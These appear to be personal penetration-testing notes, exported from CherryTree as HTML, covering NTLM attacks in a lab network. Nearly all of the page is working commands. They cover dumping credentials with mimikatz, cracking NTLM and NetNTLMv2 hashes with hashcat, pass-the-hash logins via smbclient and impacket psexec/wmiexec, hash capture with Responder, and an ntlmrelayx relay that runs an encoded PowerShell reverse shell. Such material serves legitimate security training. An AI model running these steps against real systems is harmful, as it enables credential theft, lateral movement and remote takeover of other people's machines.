<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>NTLM Attacks</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>NTLM Attacks</h1><br/><p><h1>Cracking NTLM attack</h1></p><p><div class="codebox"><pre><span style="color:#00117f;font-weight:400">Get-LocalUser</span><br /><br /><span style="color:#0088ff;font-weight:400"># powershell as admin</span><br /><span style="color:#ff9d00;font-weight:700">cd</span> C<span style="color:#ff9d00;font-weight:700">:\</span>tools<br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe<br /><br />mimikatz&gt; privilege<span style="color:#ff9d00;font-weight:700">::</span>debug <span style="color:#0088ff;font-weight:400"># see privileges</span><br /><br />mimikatz&gt; sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>logonpasswords <span style="color:#0088ff;font-weight:400"># large output</span><br /><br /><br />mimikatz&gt; token<span style="color:#ff9d00;font-weight:700">::</span>elevate<br />mimikatz&gt; lsadump<span style="color:#ff9d00;font-weight:700">::</span>sam <span style="color:#0088ff;font-weight:400"># extracts ntlm hashes (needs elevate)</span></pre></div></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># crack password and connect with rdp</span><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>passwordattackss hashcat -m 1000 nelly.hash <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>rockyou.txt<br />-r <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>hashcat<span style="color:#ff9d00;font-weight:700">/</span>rules<span style="color:#ff9d00;font-weight:700">/</span>best64.rule --force<br /><br /><span style="color:#0088ff;font-weight:400">#find correct hashcat</span><br /><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>passwordattackss xfreerdp <span style="color:#ff9d00;font-weight:700">/</span>v<span style="color:#ff9d00;font-weight:700">:</span>192.168.122.210 <span style="color:#ff9d00;font-weight:700">/</span>u<span style="color:#ff9d00;font-weight:700">:</span>nelly <span style="color:#ff9d00;font-weight:700">/</span>p<span style="color:#ff9d00;font-weight:700">:</span>nicolel <span style="color:#ff9d00;font-weight:700">/w:</span>1200 <span style="color:#ff9d00;font-weight:700">/</span>h<span style="color:#ff9d00;font-weight:700">:</span>700</pre></div></p><p></p><p></p><p><h1>Passing NTLM (perfect for lateral movement)</h1></p><p><ul><li>to SMB</p><p></li></ul><div class="codebox"><pre>kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>passwordattacks$ smbclient <span style="color:#333333;font-weight:400">\\\\</span>192.168.122.212<span style="color:#333333;font-weight:400">\\</span>secrets -U Administrator <br />	--pw<span style="color:#ffdd00;font-weight:400">-nt</span>-hash 7a38310ea6f0027ee955abed1762964b<br /><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>passwordattacks$ impacket-psexec -hashes 00000000000000000000000000000000<span style="color:#ff9d00;font-weight:700">:</span>7a38<br />310ea6f0027ee955abed1762964b Administrator@192.168.122.212<br /><span style="color:#0088ff;font-weight:400"># first 0000 il lm hash, second is ntlm</span><br /><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>-<span style="color:#ff9d00;font-weight:700">/</span>passwordattackss impacket-wmiexec -hashes 00000000000000000000000000000000<span style="color:#ff9d00;font-weight:700">:</span> 7a<span style="color:#ff9d00;font-weight:700">:</span><br />8310ea6f0027ee955abed1762964b Administrator@192.168.122.212<br /><br /><br /></pre></div></p><p><h1>scenario without local privileges (e.g. for mimikatz)</h1></p><p><ul><li>abuse NetNTLMv2</p><p></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># see local admins</span><br />PS&gt; net user paul<br /><br /><span style="color:#0088ff;font-weight:400">#setup smb server with kali responder, than connect, than get and crack netntlmv2</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> responder -I tun0<br /><br />PS&gt; <span style="color:#ff9d00;font-weight:700">dir</span> <span style="color:#333333;font-weight:400">\\</span>192.168.119.122<span style="color:#333333;font-weight:400">\t</span>est<br /><br /><span style="color:#0088ff;font-weight:400"># responder automatically cat the ntlm hash.</span><br /><span style="color:#0088ff;font-weight:400"># we save it in paul.hash</span><br /><br />hashcat -m 5600 paul.hash rockyou.txt --force<br /><br /><br /></pre></div><ul><li>relaying ntlmv2</p><p></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># tool ntlmrelayx</span><br />impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.119.212 -c <span style="color:#3ad900;font-weight:400">&quot;powershell -enc base64revshell&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400"># in files01</span><br />PS&gt; <span style="color:#ff9d00;font-weight:700">dir</span> <span style="color:#333333;font-weight:400">\\</span>192.168.119.122<span style="color:#333333;font-weight:400">\t</span>est<br />Invalid signature<br /><br /><span style="color:#0088ff;font-weight:400"># in ntlmrelayx</span><br /><span style="color:#0088ff;font-weight:400"># connection arrives and it is relayed towards target, then executes command</span><br /><br /></pre></div></p><p></p></div>
</body>
</html>
